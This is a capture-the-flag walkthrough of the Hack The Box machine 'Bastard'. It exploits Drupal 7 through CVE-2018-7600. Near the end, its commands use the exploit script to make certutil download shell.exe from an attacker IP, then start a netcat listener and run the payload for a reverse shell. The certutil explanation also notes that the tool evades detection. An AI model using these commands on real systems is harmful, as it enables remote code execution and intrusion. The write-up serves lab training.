# 🎯 Bastard

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

I start with nmap:

<figure><img src="../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

On the webpage i don't find anything interesting so i decide to register a user:

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

Looks like we can't register

<figure><img src="../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>

We then see that there is Drupal 7 running:

<figure><img src="../../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

So looking at the possible exploits ->

We find this exploit:&#x20;

<figure><img src="../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

That runs just find:

<figure><img src="../../.gitbook/assets/image (1106).png" alt=""><figcaption></figcaption></figure>

So now we are going to create a directory and import our reverse shell in it:

<figure><img src="../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

```
python3 drupa7-CVE-2018-7600.py http://10.129.233.169 -c "certutil -urlcache -f http://10.10.14.159:8080/shell.exe c:\temp\shell.exe"
```

The command you provided uses `certutil`, a command-line utility that's part of Windows. `certutil` is typically used for managing certificates and certificate authority (CA) information. However, it can also be repurposed for downloading files

* **certutil**: This is the main executable for the certificate utility.
* **-urlcache**: This option specifies that the command is to work with the URL cache. It allows `certutil` to interact with URLs and perform operations such as retrieving data from a web address.
* **-f**: This flag stands for "force" and is used to force the operation. It means `certutil` will overwrite the file if it already exists at the specified destination.
* [**http://10.10.14.159:8080/shell.exe**](http://10.10.14.159:8080/shell.exe): This is the URL from which `certutil` will download the file. In this case, it is an executable file named `shell.exe` hosted on a server with the IP address `10.10.14.159` and port `8080`.
* **c:\temp\shell.exe**: This is the local path where the downloaded file will be saved. The file will be stored as `shell.exe` in the `c:\temp` directory.

`certutil` is available by default on Windows systems, meaning the attacker does not need to install additional software, which could be detected.

Now we just need to trigger the reverse shell:

```
nc -nlvp 5454
python3 drupa7-CVE-2018-7600.py http://10.129.233.169 -c "c:\temp\shell.exe"
```

<figure><img src="../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>
